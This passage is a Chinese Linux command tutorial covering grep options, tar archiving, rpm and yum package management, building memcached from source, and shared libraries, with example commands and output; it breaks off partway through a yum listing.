当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。\n-e&lt;范本样式&gt; 或 –regexp&#x3D;&lt;范本样式&gt; : 指定字符串做为查找文件内容的样式。\n-E 或 –extended-regexp : 将样式为延伸的正则表达式来使用。\n-f&lt;规则文件&gt; 或 –file&#x3D;&lt;规则文件&gt; : 指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式。\n-F 或 –fixed-regexp : 将样式视为固定字符串的列表。\n-G 或 –basic-regexp : 将样式视为普通的表示法来使用。\n-h 或 –no-filename : 在显示符合样式的那一行之前，不标示该行所属的文件名称。\n-H 或 –with-filename : 在显示符合样式的那一行之前，表示该行所属的文件名称。\n-i 或 –ignore-case : 忽略字符大小写的差别。\n-l 或 –file-with-matches : 列出文件内容符合指定的样式的文件名称。\n-L 或 –files-without-match : 列出文件内容不符合指定的样式的文件名称。\n-n 或 –line-number : 在显示符合样式的那一行之前，标示出该行的列数编号。\n-o 或 –only-matching : 只显示匹配PATTERN 部分。\n-q 或 –quiet或–silent : 不显示任何信息。\n-r 或 –recursive : 此参数的效果和指定”-d recurse”参数相同。\n-s 或 –no-messages : 不显示错误信息。\n-v 或 –invert-match : 显示不包含匹配文本的所有行。\n-V 或 –version : 显示版本信息。\n-w 或 –word-regexp : 只显示全字符合的列。\n-x –line-regexp : 只显示全列符合的列。\n-y : 此参数的效果和指定”-i”参数相同。\n\n实例1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：\ngrep test *file \n\n结果如下所示：\n$ grep test test* #查找前缀有“test”的文件包含“test”字符串的文件  \ntestfile1:This a Linux testfile! #列出testfile1 文件中包含test字符的行  \ntestfile_2:This is a linux testfile! #列出testfile_2 文件中包含test字符的行  \ntestfile_2:Linux test #列出testfile_2 文件中包含test字符的行 \n\n2、以递归的方式查找符合条件的文件。例如，查找指定目录&#x2F;etc&#x2F;acpi 及其子目录（如果存在子目录的话）下所有文件中包含字符串”update”的文件，并打印出该字符串所在行的内容，使用的命令为：\ngrep -r update &#x2F;etc&#x2F;acpi \n\n输出结果如下：\n$ grep -r update &#x2F;etc&#x2F;acpi #以递归的方式查找“etc&#x2F;acpi”  \n#下包含“update”的文件  \n&#x2F;etc&#x2F;acpi&#x2F;ac.d&#x2F;85-anacron.sh:# (Things like the slocate updatedb cause a lot of IO.)  \nRather than  \n&#x2F;etc&#x2F;acpi&#x2F;resume.d&#x2F;85-anacron.sh:# (Things like the slocate updatedb cause a lot of  \nIO.) Rather than  \n&#x2F;etc&#x2F;acpi&#x2F;events&#x2F;thinkpad-cmos:action&#x3D;&#x2F;usr&#x2F;sbin&#x2F;thinkpad-keys--update \n\n3、反向查找。前面各个例子是查找并打印出符合条件的行，通过”-v”参数可以打印出不符合条件行的内容。\n查找文件名中包含 test 的文件中不包含test 的行，此时，使用的命令为：\ngrep -v test *test*\n\n结果如下所示：\n$ grep-v test* #查找文件名中包含test 的文件中不包含test 的行  \ntestfile1:helLinux!  \ntestfile1:Linis a free Unix-type operating system.  \ntestfile1:Lin  \ntestfile_1:HELLO LINUX!  \ntestfile_1:LINUX IS A FREE UNIX-TYPE OPTERATING SYSTEM.  \ntestfile_1:THIS IS A LINUX TESTFILE!  \ntestfile_2:HELLO LINUX!  \ntestfile_2:Linux is a free unix-type opterating system.  \n\n\n\nLinux tar 命令Linux tar（英文全拼：tape archive ）命令用于备份文件。\ntar 是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。\n语法tar [-ABcdgGhiklmMoOpPrRsStuUvwWxzZ][-b &lt;区块数目&gt;][-C &lt;目的目录&gt;][-f &lt;备份文件&gt;][-F &lt;Script文件&gt;][-K &lt;文件&gt;][-L &lt;媒体容量&gt;][-N &lt;日期时间&gt;][-T &lt;范本文件&gt;][-V &lt;卷册名称&gt;][-X &lt;范本文件&gt;][-&lt;设备编号&gt;&lt;存储密度&gt;][--after-date&#x3D;&lt;日期时间&gt;][--atime-preserve][--backuup&#x3D;&lt;备份方式&gt;][--checkpoint][--concatenate][--confirmation][--delete][--exclude&#x3D;&lt;范本样式&gt;][--force-local][--group&#x3D;&lt;群组名称&gt;][--help][--ignore-failed-read][--new-volume-script&#x3D;&lt;Script文件&gt;][--newer-mtime][--no-recursion][--null][--numeric-owner][--owner&#x3D;&lt;用户名称&gt;][--posix][--erve][--preserve-order][--preserve-permissions][--record-size&#x3D;&lt;区块数目&gt;][--recursive-unlink][--remove-files][--rsh-command&#x3D;&lt;执行指令&gt;][--same-owner][--suffix&#x3D;&lt;备份字尾字符串&gt;][--totals][--use-compress-program&#x3D;&lt;执行指令&gt;][--version][--volno-file&#x3D;&lt;编号文件&gt;][文件或目录...]\n\n参数：\n\n-A或–catenate 新增文件到已存在的备份文件。\n-b&lt;区块数目&gt;或–blocking-factor&#x3D;&lt;区块数目&gt; 设置每笔记录的区块数目，每个区块大小为12Bytes。\n-B或–read-full-records 读取数据时重设区块大小。\n-c或–create 建立新的备份文件。\n-C&lt;目的目录&gt;或–directory&#x3D;&lt;目的目录&gt; 切换到指定的目录。\n-d或–diff或–compare 对比备份文件内和文件系统上的文件的差异。\n-f&lt;备份文件&gt;或–file&#x3D;&lt;备份文件&gt; 指定备份文件。\n-F&lt;Script文件&gt;或–info-script&#x3D;&lt;Script文件&gt; 每次更换磁带时，就执行指定的Script文件。\n-g或–listed-incremental 处理GNU格式的大量备份。\n-G或–incremental 处理旧的GNU格式的大量备份。\n-h或–dereference 不建立符号连接，直接复制该连接所指向的原始文件。\n-i或–ignore-zeros 忽略备份文件中的0 Byte区块，也就是EOF。\n-k或–keep-old-files 解开备份文件时，不覆盖已有的文件。\n-K&lt;文件&gt;或–starting-file&#x3D;&lt;文件&gt; 从指定的文件开始还原。\n-l或–one-file-system 复制的文件或目录存放的文件系统，必须与tar指令执行时所处的文件系统相同，否则不予复制。\n-L&lt;媒体容量&gt;或-tape-length&#x3D;&lt;媒体容量&gt; 设置存放每体的容量，单位以1024 Bytes计算。\n-m或–modification-time 还原文件时，不变更文件的更改时间。\n-M或–multi-volume 在建立，还原备份文件或列出其中的内容时，采用多卷册模式。\n-N&lt;日期格式&gt;或–newer&#x3D;&lt;日期时间&gt; 只将较指定日期更新的文件保存到备份文件里。\n-o或–old-archive或–portability 将资料写入备份文件时使用V7格式。\n-O或–stdout 把从备份文件里还原的文件输出到标准输出设备。\n-p或–same-permissions 用原来的文件权限还原文件。\n-P或–absolute-names 文件名使用绝对名称，不移除文件名称前的”&#x2F;“号。\n-r或–append 新增文件到已存在的备份文件的结尾部分。\n-R或–block-number 列出每个信息在备份文件中的区块编号。\n-s或–same-order 还原文件的顺序和备份文件内的存放顺序相同。\n-S或–sparse 倘若一个文件内含大量的连续0字节，则将此文件存成稀疏文件。\n-t或–list 列出备份文件的内容。\n-T&lt;范本文件&gt;或–files-from&#x3D;&lt;范本文件&gt; 指定范本文件，其内含有一个或多个范本样式，让tar解开或建立符合设置条件的文件。\n-u或–update 仅置换较备份文件内的文件更新的文件。\n-U或–unlink-first 解开压缩文件还原文件之前，先解除文件的连接。\n-v或–verbose 显示指令执行过程。\n-V&lt;卷册名称&gt;或–label&#x3D;&lt;卷册名称&gt; 建立使用指定的卷册名称的备份文件。\n-w或–interactive 遭遇问题时先询问用户。\n-W或–verify 写入备份文件后，确认文件正确无误。\n-x或–extract或–get 从备份文件中还原文件。\n-X&lt;范本文件&gt;或–exclude-from&#x3D;&lt;范本文件&gt; 指定范本文件，其内含有一个或多个范本样式，让ar排除符合设置条件的文件。\n-z或–gzip或–ungzip 通过gzip指令处理备份文件。\n-Z或–compress或–uncompress 通过compress指令处理备份文件。\n-&lt;设备编号&gt;&lt;存储密度&gt; 设置备份用的外围设备编号及存放数据的密度。\n–after-date&#x3D;&lt;日期时间&gt; 此参数的效果和指定”-N”参数相同。\n–atime-preserve 不变更文件的存取时间。\n–backup&#x3D;&lt;备份方式&gt;或–backup 移除文件前先进行备份。\n–checkpoint 读取备份文件时列出目录名称。\n–concatenate 此参数的效果和指定”-A”参数相同。\n–confirmation 此参数的效果和指定”-w”参数相同。\n–delete 从备份文件中删除指定的文件。\n–exclude&#x3D;&lt;范本样式&gt; 排除符合范本样式的文件。\n–group&#x3D;&lt;群组名称&gt; 把加入设备文件中的文件的所属群组设成指定的群组。\n–help 在线帮助。\n–ignore-failed-read 忽略数据读取错误，不中断程序的执行。\n–new-volume-script&#x3D;&lt;Script文件&gt; 此参数的效果和指定”-F”参数相同。\n–newer-mtime 只保存更改过的文件。\n–no-recursion 不做递归处理，也就是指定目录下的所有文件及子目录不予处理。\n–null 从null设备读取文件名称。\n–numeric-owner 以用户识别码及群组识别码取代用户名称和群组名称。\n–owner&#x3D;&lt;用户名称&gt; 把加入备份文件中的文件的拥有者设成指定的用户。\n–posix 将数据写入备份文件时使用POSIX格式。\n–preserve 此参数的效果和指定”-ps”参数相同。\n–preserve-order 此参数的效果和指定”-A”参数相同。\n–preserve-permissions 此参数的效果和指定”-p”参数相同。\n–record-size&#x3D;&lt;区块数目&gt; 此参数的效果和指定”-b”参数相同。\n–recursive-unlink 解开压缩文件还原目录之前，先解除整个目录下所有文件的连接。\n–remove-files 文件加入备份文件后，就将其删除。\n–rsh-command&#x3D;&lt;执行指令&gt; 设置要在远端主机上执行的指令，以取代rsh指令。\n–same-owner 尝试以相同的文件拥有者还原文件。\n–suffix&#x3D;&lt;备份字尾字符串&gt; 移除文件前先行备份。\n–totals 备份文件建立后，列出文件大小。\n–use-compress-program&#x3D;&lt;执行指令&gt; 通过指定的指令处理备份文件。\n–version 显示版本信息。\n–volno-file&#x3D;&lt;编号文件&gt; 使用指定文件内的编号取代预设的卷册编号。\n\n实例压缩文件 非打包\n# touch a.c       \n# tar -czvf test.tar.gz a.c   &#x2F;&#x2F;压缩 a.c文件为test.tar.gz\na.c\n\n列出压缩文件内容\n# tar -tzvf test.tar.gz \n-rw-r--r-- root&#x2F;root     0 2010-05-24 16:51:59 a.c\n\n解压文件\n# tar -xzvf test.tar.gz \na.c\n\n\n\n九：在Linux中安装应用\n\n\n\n\n\n\n\n\n参考：\nhttps://cloud.tencent.com/developer/article/1702244\n使用rpm离线安装（优先级较低）\nLinux rpm 命令用于管理套件。\nrpm（英文全拼：redhat package manager） 原本是 Red Hat Linux 发行版专门用来管理 Linux 各项套件的程序，由于它遵循 GPL 规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM 套件管理方式的出现，让 Linux 易于安装，升级，间接提升了 Linux 的适用度。\n语法rpm [-acdhilqRsv][-b&lt;完成阶段&gt;&lt;套间档&gt;+][-e&lt;套件挡&gt;][-f&lt;文件&gt;+][-i&lt;套件档&gt;][-p&lt;套件档&gt;＋][-U&lt;套件档&gt;][-vv][--addsign&lt;套件档&gt;+][--allfiles][--allmatches][--badreloc][--buildroot&lt;根目录&gt;][--changelog][--checksig&lt;套件档&gt;+][--clean][--dbpath&lt;数据库目录&gt;][--dump][--excludedocs][--excludepath&lt;排除目录&gt;][--force][--ftpproxy&lt;主机名称或IP地址&gt;][--ftpport&lt;通信端口&gt;][--help][--httpproxy&lt;主机名称或IP地址&gt;][--httpport&lt;通信端口&gt;][--ignorearch][--ignoreos][--ignoresize][--includedocs][--initdb][justdb][--nobulid][--nodeps][--nofiles][--nogpg][--nomd5][--nopgp][--noorder][--noscripts][--notriggers][--oldpackage][--percent][--pipe&lt;执行指令&gt;][--prefix&lt;目的目录&gt;][--provides][--queryformat&lt;档头格式&gt;][--querytags][--rcfile&lt;配置档&gt;][--rebulid&lt;套件档&gt;][--rebuliddb][--recompile&lt;套件档&gt;][--relocate&lt;原目录&gt;&#x3D;&lt;新目录&gt;][--replacefiles][--replacepkgs][--requires][--resign&lt;套件档&gt;+][--rmsource][--rmsource&lt;文件&gt;][--root&lt;根目录&gt;][--scripts][--setperms][--setugids][--short-circuit][--sign][--target&#x3D;&lt;安装平台&gt;+][--test][--timecheck&lt;检查秒数&gt;][--triggeredby&lt;套件档&gt;][--triggers][--verify][--version][--whatprovides&lt;功能特性&gt;][--whatrequires&lt;功能特性&gt;]\n\n参数说明：\n\n-a 　查询所有套件。\n-b&lt;完成阶段&gt;&lt;套件档&gt;+或-t &lt;完成阶段&gt;&lt;套件档&gt;+ 　设置包装套件的完成阶段，并指定套件档的文件名称。\n-c 　只列出组态配置文件，本参数需配合”-l”参数使用。\n-d 　只列出文本文件，本参数需配合”-l”参数使用。\n-e&lt;套件档&gt;或–erase&lt;套件档&gt; 　删除（卸载）指定的套件。\n-f&lt;文件&gt;+ 　查询拥有指定文件的套件。\n-h或–hash 　套件安装时列出标记。\n-i 　显示套件的相关信息。\n-i&lt;套件档&gt;或–install&lt;套件档&gt; 　安装指定的套件档。\n-l 　显示套件的文件列表。\n-p&lt;套件档&gt;+ 　查询指定的RPM套件档。\n-q 　使用询问模式，当遇到任何问题时，rpm指令会先询问用户。\n-R 　显示套件的关联性信息。\n-s 　显示文件状态，本参数需配合”-l”参数使用。\n-U&lt;套件档&gt;或–upgrade&lt;套件档&gt; 升级指定的套件档。\n-v 　显示指令执行过程。\n-vv 　详细显示指令执行过程，便于排错。\n-addsign&lt;套件档&gt;+ 　在指定的套件里加上新的签名认证。\n–allfiles 　安装所有文件。\n–allmatches 　删除符合指定的套件所包含的文件。\n–badreloc 　发生错误时，重新配置文件。\n–buildroot&lt;根目录&gt; 　设置产生套件时，欲当作根目录的目录。\n–changelog 　显示套件的更改记录。\n–checksig&lt;套件档&gt;+ 　检验该套件的签名认证。\n–clean 　完成套件的包装后，删除包装过程中所建立的目录。\n–dbpath&lt;数据库目录&gt; 　设置欲存放RPM数据库的目录。\n–dump 　显示每个文件的验证信息。本参数需配合”-l”参数使用。\n–excludedocs 　安装套件时，不要安装文件。\n–excludepath&lt;排除目录&gt; 　忽略在指定目录里的所有文件。\n–force 　强行置换套件或文件。\n–ftpproxy&lt;主机名称或IP地址&gt; 　指定FTP代理服务器。\n–ftpport&lt;通信端口&gt; 　设置FTP服务器或代理服务器使用的通信端口。\n–help 　在线帮助。\n–httpproxy&lt;主机名称或IP地址&gt; 　指定HTTP代理服务器。\n–httpport&lt;通信端口&gt; 　设置HTTP服务器或代理服务器使用的通信端口。\n–ignorearch 　不验证套件档的结构正确性。\n–ignoreos 　不验证套件档的结构正确性。\n–ignoresize 　安装前不检查磁盘空间是否足够。\n–includedocs 　安装套件时，一并安装文件。\n–initdb 　确认有正确的数据库可以使用。\n–justdb 　更新数据库，当不变动任何文件。\n–nobulid 　不执行任何完成阶段。\n–nodeps 　不验证套件档的相互关联性。\n–nofiles 　不验证文件的属性。\n–nogpg 　略过所有GPG的签名认证。\n–nomd5 　不使用MD5编码演算确认文件的大小与正确性。\n–nopgp 　略过所有PGP的签名认证。\n–noorder 　不重新编排套件的安装顺序，以便满足其彼此间的关联性。\n–noscripts 　不执行任何安装Script文件。\n–notriggers 　不执行该套件包装内的任何Script文件。\n–oldpackage 　升级成旧版本的套件。\n–percent 　安装套件时显示完成度百分比。\n–pipe&lt;执行指令&gt; 　建立管道，把输出结果转为该执行指令的输入数据。\n–prefix&lt;目的目录&gt; 　若重新配置文件，就把文件放到指定的目录下。\n–provides 　查询该套件所提供的兼容度。\n–queryformat&lt;档头格式&gt; 　设置档头的表示方式。\n–querytags 　列出可用于档头格式的标签。\n–rcfile&lt;配置文件&gt; 　使用指定的配置文件。\n–rebulid&lt;套件档&gt; 　安装原始代码套件，重新产生二进制文件的套件。\n–rebuliddb 　以现有的数据库为主，重建一份数据库。\n–recompile&lt;套件档&gt; 　此参数的效果和指定”–rebulid”参数类似，当不产生套件档。\n–relocate&lt;原目录&gt;&#x3D;&lt;新目录&gt; 　把本来会放到原目录下的文件改放到新目录。\n–replacefiles 　强行置换文件。\n–replacepkgs 　强行置换套件。\n–requires 　查询该套件所需要的兼容度。\n–resing&lt;套件档&gt;+ 　删除现有认证，重新产生签名认证。\n–rmsource 　完成套件的包装后，删除原始代码。\n–rmsource&lt;文件&gt; 　删除原始代码和指定的文件。\n–root&lt;根目录&gt; 　设置欲当作根目录的目录。\n–scripts 　列出安装套件的Script的变量。\n–setperms 　设置文件的权限。\n–setugids 　设置文件的拥有者和所属群组。\n–short-circuit 　直接略过指定完成阶段的步骤。\n–sign 　产生PGP或GPG的签名认证。\n–target&#x3D;&lt;安装平台&gt;+ 　设置产生的套件的安装平台。\n–test 　仅作测试，并不真的安装套件。\n–timecheck&lt;检查秒数&gt; 　设置检查时间的计时秒数。\n–triggeredby&lt;套件档&gt; 　查询该套件的包装者。\n–triggers 　展示套件档内的包装Script。\n–verify 　此参数的效果和指定”-q”参数相同。\n–version 　显示版本信息。\n–whatprovides&lt;功能特性&gt; 　查询该套件对指定的功能特性所提供的兼容度。\n–whatrequires&lt;功能特性&gt; 　查询该套件对指定的功能特性所需要的兼容度。\n\n实例安装软件\n# rpm -hvi dejagnu-1.4.2-10.noarch.rpm \n警告：dejagnu-1.4.2-10.noarch.rpm: V3 DSA 签名：NOKEY, key ID db42a60e\n准备...           \n########################################### [100%]\n\n显示软件安装信息\n# rpm -qi dejagnu-1.4.2-10.noarch.rpm\n\n【第1次更新 教程、类似命令关联】\n\n\n\n基于源代码安装应用（专业模式，优先级中）\n\n\n\n\n\n\n\n\n参考\nhttps://blog.csdn.net/qq_29186859/article/details/117084368\n\nLinux软件简介Linux上几乎所有的软件都经过了GPL授权，因此几乎所有的软件都会提供源码。  而一个软件要在Linux上执行，必须是二进制文件，因此当我们拿到软件源码后，需要将它编译成二进制文件才能在Linux上运行。\n软件编译过程将源码编译成可供Linux运行的二进制文件一共需要两步：  1. 使用gcc编译器将源码编译成目标文件  2. 再次使用gcc编译器将目标文件链接成二进制文件\n这过程看似简单，实则不然。一个软件的源代码往往被封装在多个源文件中，此外这些文件有错综复杂的依赖关系，编译需要严格按照指定的顺序进行，这无疑增加了编译的难度。好在make命令可以帮助我们简化编译过程。\n整个编译过程被浓缩在Makefile文件中，当执行make命令时，make会去当前目录中寻找Makefile文件，并根据该文件中的要求完成整个编译过程。\n而Makefile文件由configure命令产生。当执行configure命令时，configure会根据当前系统环境动态生成一个适合本系统的Makefile文件，供make命令使用。\nLinux源码安装步骤\n获取源码  将软件的源码下载至&#x2F;usr&#x2F;local&#x2F;，并解压。\n查看INSTALL与README文件  解压后查看INSTALL与README文件，这两个文件中详细介绍了本软件的安装方法和注意事项。\n创建Makefile文件  执行configure命令，生成Makefile文件。\n编译  执行make clean;make命令将源码编译成二进制文件。  PS:make clean命令用来清除上一次编译生成的目标文件。这个步骤可有可无，但为了确保编译的成功，还是加上为好。防止由于软件中含有残留的目标文件导致编译失败。\n安装  执行make install命令将上一步编译好的二进制文件安装到指定的目录中去。\n\n安装演示1.进入&#x2F;usr&#x2F;local&#x2F;，并创建memcached目录：\ncd &#x2F;usr&#x2F;local&#x2F;\nmkdir memcached\n\n复制\n2.下载memcached的源码\nwget http:&#x2F;&#x2F;memcached.org&#x2F;files&#x2F;memcached-1.4.29.tar.gz\n\n复制\n3.解压源码\ntar -zxvf memcached-1.4.29.tar.gz\n\n复制\n4.执行configure，生成Makefile文件\n.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;memcached&#x2F;\n\n复制\n此时当前目录下将会生成一个Makefile文件。\n\n注意：–prefix参数指定软件安装目录。当执行make install命令时，会将软件安装在此路径中。\n\n5.执行make，编译源码\nmake clean; make\n\n复制\n此时make会读取Makefile文件，将源码编译成二进制文件，并存放在当前目录下。\n6.执行make install，将软件安装至指定目录\nmake install\n\n复制\n此时二进制文件会被安装到先前configure prefix参数设置的路径中去。  安装完成！\nLinux函数库1. 什么是“Linux函数库”？运行在Linux上的软件时常会调用Linux内核的某些功能或其他软件的某些功能，那么这些被软件调用的功能称为Linux的函数库。软件自身的函数库存放在软件安装目录下的lib中，而Linux的函数库存放在&#x2F;usr&#x2F;lib和&#x2F;usr&#x2F;include中，linux内核的函数库存放在&#x2F;lib&#x2F;modules中。\n2. Linux函数库的分类Linux函数库分为静态函数库 和 动态函数库。  1. 静态函数库  - 扩展名：xxx.a  - 在编译时会被整合到软件的二进制文件中去。因此拥有静态函数库的软件较为庞大。而且当系统的函数库更新时，引用该函数库的所有软件都需要重新编译才能正常使用。这是非常麻烦的！但拥有静态函数库的软件可以独立运行。  2. 动态函数库  - 扩展名：xxx.so  - 在编译时仅仅将函数库的路径整合到软件的二进制文件中去。由于软件中包含的是函数库的路径，因此该软件无法独立运行，且函数库的路径不能发生变化，一旦变化，该软件将无法找到函数库，从而无法运行！这是动态函数库的最大缺点。但当动态函数库更新时，软件无需重新编译，因此更新较为方便，这是动态函数库的最大优点。\n目前大部分软件均使用动态函数库，就是因为动态函数库在更新时体现出的优势。\n3. 提升函数库读取效率软件在运行某些功能时需要调用函数库中的函数，而函数库又是以文件的形式存放在外设上。那么如果将函数库存放在内存中，那么将会大大提升读取速度。在Linux中，可以使用ldconfig命令将指定的函数库加载进内存。具体步骤如下：  1. 在&#x2F;etc&#x2F;ld.so.conf中设置需要加载进内存的函数库  2. 使用ldconfig命令使配置生效\n4. 查看软件的动态函数库使用ldd命令即可查看指定软件所使用的全部动态函数库。\n[root@iZ28st035lsZ usr]# ldd &#x2F;usr&#x2F;bin&#x2F;passwd \n    linux-vdso.so.1 &#x3D;&gt;  (0x00007fffa2bfd000)\n    libuser.so.1 &#x3D;&gt; &#x2F;usr&#x2F;lib64&#x2F;libuser.so.1 (0x0000003edac00000)\n    libcrypt.so.1 &#x3D;&gt; &#x2F;lib64&#x2F;libcrypt.so.1 (0x0000003edc400000)\n    libgobject-2.0.so.0 &#x3D;&gt; &#x2F;lib64&#x2F;libgobject-2.0.so.0 (0x0000003edcc00000)\n    libgmodule-2.0.so.0 &#x3D;&gt; &#x2F;lib64&#x2F;libgmodule-2.0.so.0 (0x0000003edf800000)\n    libdl.so.2 &#x3D;&gt; &#x2F;lib64&#x2F;libdl.so.2 (0x0000003eda800000)\n    libglib-2.0.so.0 &#x3D;&gt; &#x2F;lib64&#x2F;libglib-2.0.so.0 (0x0000003edc800000)\n    libpopt.so.0 &#x3D;&gt; &#x2F;usr&#x2F;lib64&#x2F;libpopt.so.0 (0x0000003edd400000)\n    libpam_misc.so.0 &#x3D;&gt; &#x2F;lib64&#x2F;libpam_misc.so.0 (0x0000003edc000000)\n    libaudit.so.0 &#x3D;&gt; &#x2F;lib64&#x2F;libaudit.so.0 (0x0000003edd000000)\n    libselinux.so.1 &#x3D;&gt; &#x2F;lib64&#x2F;libselinux.so.1 (0x0000003edb400000)\n    libc.so.6 &#x3D;&gt; &#x2F;lib64&#x2F;libc.so.6 (0x0000003eda400000)\n    libpam.so.0 &#x3D;&gt; &#x2F;lib64&#x2F;libpam.so.0 (0x0000003edf400000)\n    librt.so.1 &#x3D;&gt; &#x2F;lib64&#x2F;librt.so.1 (0x0000003edbc00000)\n    &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x0000003ed9c00000)\n    libsepol.so.1 &#x3D;&gt; &#x2F;lib64&#x2F;libsepol.so.1 (0x0000003edb800000)\n    libpthread.so.0 &#x3D;&gt; &#x2F;lib64&#x2F;libpthread.so.0 (0x0000003edb000000)\n\n\n\n用yum进行安装（优先级高）\nyum（ Yellow dog Updater, Modified）是一个在 Fedora 和 RedHat 以及 SUSE 中的 Shell 前端软件包管理器。\n基于 RPM 包管理，能够从指定的服务器自动下载 RPM 包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。\nyum 提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。\nyum 语法yum [options] [command] [package ...]\n\n\noptions：可选，选项包括-h（帮助），-y（当安装过程提示选择全部为 “yes”），-q（不显示安装的过程）等等。\ncommand：要进行的操作。\npackage：安装的包名。\n\n\nyum常用命令\n\\1. 列出所有可更新的软件清单命令：yum check-update\n\\2. 更新所有软件命令：yum update\n\\3. 仅安装指定的软件命令：yum install \n\\4. 仅更新指定的软件命令：yum update \n\\5. 列出所有可安裝的软件清单命令：yum list\n\\6. 删除软件包命令：yum remove \n\\7. 查找软件包命令：yum search \n\\8. 清除缓存命令:\nyum clean packages: 清除缓存目录下的软件包\nyum clean headers: 清除缓存目录下的 headers\nyum clean oldheaders: 清除缓存目录下旧的 headers\nyum clean, yum clean all (&#x3D; yum clean packages; yum clean oldheaders) :清除缓存目录下的软件包及旧的 headers\n\n\n\n实例 1安装 pam-devel\n[root@www ~]# yum install pam-devel\nSetting up Install Process\nParsing package install arguments\nResolving Dependencies  &lt;&#x3D;&#x3D;先检查软件的属性相依问题\n--&gt; Running transaction check\n---&gt; Package pam-devel.i386 0:0.99.6.2-4.el5 set to be updated\n--&gt; Processing Dependency: pam &#x3D; 0.99.6.2-4.el5 for package: pam-devel\n--&gt; Running transaction check\n---&gt; Package pam.i386 0:0.99.6.2-4.el5 set to be updated\nfilelists.xml.gz          100% |&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;| 1.6 MB    00:05\nfilelists.xml.gz          100% |&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;| 138 kB    00:00\n-&gt; Finished Dependency Resolution\n……(省略)\n\n实例 2移除 pam-devel\n[root@www ~]# yum remove pam-devel\nSetting up Remove Process\nResolving Dependencies  &lt;&#x3D;&#x3D;同样的，先解决属性相依的问题\n--&gt; Running transaction check\n---&gt; Package pam-devel.i386 0:0.99.6.2-4.el5 set to be erased\n--&gt; Finished Dependency Resolution\n\nDependencies Resolved\n\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n Package                 Arch       Version          Repository        Size\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\nRemoving:\n pam-devel               i386       0.99.6.2-4.el5   installed         495 k\n\nTransaction Summary\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\nInstall      0 Package(s)\nUpdate       0 Package(s)\nRemove       1 Package(s)  &lt;&#x3D;&#x3D;还好，并没有属性相依的问题，单纯移除一个软件\n\nIs this ok [y&#x2F;N]: y\nDownloading Packages:\nRunning rpm_check_debug\nRunning Transaction Test\nFinished Transaction Test\nTransaction Test Succeeded\nRunning Transaction\n  Erasing   : pam-devel                    ######################### [1&#x2F;1]\n\nRemoved: pam-devel.i386 0:0.99.6.2-4.el5\nComplete!\n\n实例 3利用 yum 的功能，找出以 pam 为开头的软件名称有哪些？\n[root@www ~]# yum list pam*\nInstalled Packages\npam.i386                  0.99.6.2-3.27.el5      installed\npam_ccreds.i386           3-5                    installed\npam_krb5.i386             2.2.14-1               installed\npam_passwdqc.i386         